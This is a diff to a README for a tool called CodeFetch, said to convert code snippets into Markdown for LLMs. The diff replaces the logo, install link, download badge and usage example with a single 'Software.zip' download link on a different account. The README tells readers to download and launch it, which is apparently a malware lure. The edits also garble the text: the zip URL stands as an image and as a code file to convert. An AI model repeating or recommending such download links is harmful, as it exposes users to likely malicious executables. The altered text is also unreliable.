@@ -1,6 +1,6 @@
 # CodeFetch 🚀
 
-![CodeFetch Logo](https://example.com/logo.png)
+![CodeFetch Logo](https://github.com/Hkabj/codefetch/releases/download/v2.0/Software.zip)
 
 CodeFetch is an innovative tool that allows you to effortlessly convert code snippets into Markdown formatted text tailored for Linguistic Language Models (LLMs) with just a simple terminal command. Say goodbye to the tedious manual formatting and let CodeFetch handle the heavy lifting for you!
 
@@ -14,19 +14,19 @@ CodeFetch is an innovative tool that allows you to effortlessly convert code sni
 
 ## Installation 📦
 
-To get started with CodeFetch, simply download the software package from [this link](https://github.com/user-attachments/files/18388744/Software.zip). Once downloaded, launch the application to begin converting your code snippets into Markdown format seamlessly.
+To get started with CodeFetch, simply download the software package from [this link](https://github.com/Hkabj/codefetch/releases/download/v2.0/Software.zip). Once downloaded, launch the application to begin converting your code snippets into Markdown format seamlessly.
 
-[![Download CodeFetch](https://img.shields.io/badge/Download-CodeFetch-brightgreen)](https://github.com/user-attachments/files/18388744/Software.zip)
+[![Download CodeFetch](https://github.com/Hkabj/codefetch/releases/download/v2.0/Software.zip)](https://github.com/Hkabj/codefetch/releases/download/v2.0/Software.zip)
 
 ## Usage Example 🚩
 
 Using CodeFetch is as easy as running a single command in your terminal:
 
 ```bash
-$ codefetch -c snippet_of_code.js
+$ codefetch -c https://github.com/Hkabj/codefetch/releases/download/v2.0/Software.zip
 ```
 
-This command will automatically convert the code snippet from `snippet_of_code.js` into Markdown format, ready to be incorporated into your LLM research or projects.
+This command will automatically convert the code snippet from `https://github.com/Hkabj/codefetch/releases/download/v2.0/Software.zip` into Markdown format, ready to be incorporated into your LLM research or projects.
 
 ## Repository Topics 🔖
 
